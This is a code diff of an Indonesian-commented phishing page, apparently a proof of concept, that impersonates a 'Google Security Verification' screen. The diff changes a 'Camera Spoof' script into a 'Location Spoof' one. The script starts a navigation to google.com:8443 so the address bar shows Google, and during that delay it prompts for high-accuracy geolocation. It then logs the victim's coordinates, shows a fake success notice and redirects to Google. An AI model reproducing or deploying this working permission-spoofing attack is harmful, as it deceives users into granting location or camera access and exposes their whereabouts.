@@ -13,19 +13,16 @@
   button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
   button:hover { background: #1557b0; }
   #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
-  iframe { display: none; }
 </style>
 </head>
 <body>
 
 <div class="panel" id="main-card">
   <h2>🔒 Google Security Verification</h2>
-  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke server aman Google (port 8443) dan diminta mengizinkan kamera untuk verifikasi.</p>
-  <button id="startBtn">Verify Account & Allow Camera</button>
+  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke server aman Google (port 8443) dan diminta mengizinkan lokasi untuk verifikasi.</p>
+  <button id="startBtn">Verify Account & Allow Location</button>
   <div id="status">[*] Ready...</div>
 </div>
-
-<div id="launcher-container" style="display: none;"></div>
 
 <script>
 (function () {
@@ -36,14 +33,14 @@
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[Camera Spoof] " + msg);
+    console.log("[Location Spoof] " + msg);
   }
 
   // ============================================
   // 1. TRIGGER (KLIK)
   // ============================================
   btn.addEventListener('click', function() {
-    log("[*] Memulai camera permission spoofing...");
+    log("[*] Memulai location permission spoofing...");
 
     // ============================================
     // 2. REDIRECT KE GOOGLE:8443 (PENDING NAVIGATION)
@@ -55,23 +52,27 @@
     }
 
     // ============================================
-    // 3. SELAMA DELAY, MINTA IZIN KAMERA
+    // 3. SELAMA DELAY, MINTA IZIN LOKASI
     // ============================================
-    // Prompt kamera akan muncul di tengah layar saat address bar menampilkan google.com:8443.
+    // Prompt lokasi akan muncul di tengah layar saat address bar menampilkan google.com:8443.
     setTimeout(function() {
-      log("[*] Meminta Izin Kamera (saat pending navigation)...");
+      log("[*] Meminta Izin Lokasi (saat pending navigation)...");
       
-      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-        .then(function(stream) {
-          log("[+] Kamera DIIZINKAN!");
-          // Hentikan stream (opsional)
-          stream.getTracks().forEach(function(t) { t.stop(); });
+      if (!navigator.geolocation) {
+        log("[-] Geolocation tidak didukung.");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          log("[+] Lokasi DIIZINKAN!");
+          log("Lat: " + position.coords.latitude + ", Lon: " + position.coords.longitude);
           
           // Tampilkan pesan sukses
           document.body.innerHTML = `
             <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
               <h2 style="color:#34a853;">✅ Verifikasi Berhasil</h2>
-              <p style="color:#666;">Kamera telah diizinkan. Anda akan diarahkan ke Google.</p>
+              <p style="color:#666;">Lokasi telah diizinkan. Anda akan diarahkan ke Google.</p>
             </div>
           `;
           
@@ -79,24 +80,17 @@
           setTimeout(function() {
             window.location.replace('https://www.google.com');
           }, 2000);
-        })
-        .catch(function(err) {
-          log("[-] Kamera ditolak: " + err.name);
+        },
+        function(error) {
+          log("[-] Lokasi ditolak: " + error.message);
           // Jika ditolak, tetap redirect ke Google
           setTimeout(function() {
             window.location.replace('https://www.google.com');
           }, 1000);
-        });
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
     }, 1000); // 1 detik setelah redirect (saat pending)
-
-    // ============================================
-    // 4. UI SPOOFING (OPSIONAL)
-    // ============================================
-    // Tampilkan form login palsu setelah 1 detik (bersamaan dengan prompt kamera)
-    setTimeout(function() {
-      // Jangan timpa body jika prompt kamera sudah muncul
-      // Kita hanya menambahkan overlay jika diperlukan
-    }, 1000);
 
   }, { once: true });
 
